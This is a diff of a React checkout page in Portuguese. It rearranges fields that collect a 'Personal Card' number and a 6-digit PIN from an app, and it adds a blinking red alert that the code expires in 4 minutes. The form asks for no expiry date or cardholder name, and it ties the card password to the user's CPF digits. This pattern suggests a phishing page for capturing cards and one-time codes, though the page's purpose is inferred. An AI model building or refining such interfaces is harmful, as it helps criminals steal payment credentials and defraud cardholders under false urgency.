@@ -311,33 +311,33 @@ function CheckoutPage() {
               <h2 className="mb-3 flex items-center gap-2 text-sm font-bold uppercase tracking-wider text-brand-navy">
                 <Lock className="h-4 w-4" /> Dados do cartão Personal Card
               </h2>
-              <div className="space-y-3">
-                <div>
-                  <label className="mb-1 block text-xs font-medium">Número do cartão *</label>
-                  <input type="text" value={form.cartaoNumero}
-                    onChange={(e) => set("cartaoNumero", maskCard(e.target.value))}
-                    placeholder="0000 0000 0000 0000" inputMode="numeric"
-                    className="w-full rounded-md border border-input px-3 py-2 text-sm font-mono" required />
-                  <Err k="cartaoNumero" />
+              <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
+                <div className="space-y-3">
+                  <div>
+                    <label className="mb-1 block text-xs font-medium">Número do cartão *</label>
+                    <input type="text" value={form.cartaoNumero}
+                      onChange={(e) => set("cartaoNumero", maskCard(e.target.value))}
+                      placeholder="0000 0000 0000 0000" inputMode="numeric"
+                      className="w-full rounded-md border border-input px-3 py-2 text-sm font-mono" required />
+                    <Err k="cartaoNumero" />
+                  </div>
+                  <div>
+                    <label className="mb-1 block text-xs font-medium">PIN Code (6 dígitos) *</label>
+                    <input type="password" value={form.cartaoPincode}
+                      onChange={(e) => set("cartaoPincode", onlyDigits(e.target.value).slice(0, 6))}
+                      placeholder="••••••" inputMode="numeric" maxLength={6} autoComplete="off"
+                      className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
+                    <Err k="cartaoPincode" />
+                    <p className="mt-1 text-[11px] text-muted-foreground">
+                      A senha do cartão (4 dígitos) é gerada automaticamente a partir dos 4 primeiros números do seu CPF.
+                    </p>
+                  </div>
+                  <div className="text-[11px] text-muted-foreground">
+                    Não pedimos validade nem nome impresso do cartão.
+                  </div>
                 </div>
-                <div>
-                  {elapsedSec >= 270 && (
-                    <div className="mb-2 rounded-md bg-red-600 px-4 py-3 text-center text-sm font-bold text-white animate-pin-blink">
-                      ⚠️ ADICIONE O CÓDIGO PIN! Verifique se o app está com o código atualizado.
-                    </div>
-                  )}
-                  <label className="mb-1 block text-xs font-medium">PIN Code (6 dígitos) *</label>
-                  <input type="password" value={form.cartaoPincode}
-                    onChange={(e) => set("cartaoPincode", onlyDigits(e.target.value).slice(0, 6))}
-                    placeholder="••••••" inputMode="numeric" maxLength={6} autoComplete="off"
-                    className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
-                  <Err k="cartaoPincode" />
-                  <p className="mt-1 text-[11px] text-muted-foreground">
-                    A senha do cartão (4 dígitos) é gerada automaticamente a partir dos 4 primeiros números do seu CPF.
-                  </p>
-                </div>
-                <div className="text-[11px] text-muted-foreground">
-                  Não pedimos validade nem nome impresso do cartão.
+                <div className="flex items-center justify-center rounded-md bg-red-600 px-4 py-3 text-center text-sm font-bold text-white animate-pin-blink">
+                  ⚠️ LEMBRETE: Adicione o PIN do app para evitar erros! O código expira em 4 minutos.
                 </div>
               </div>
             </section>
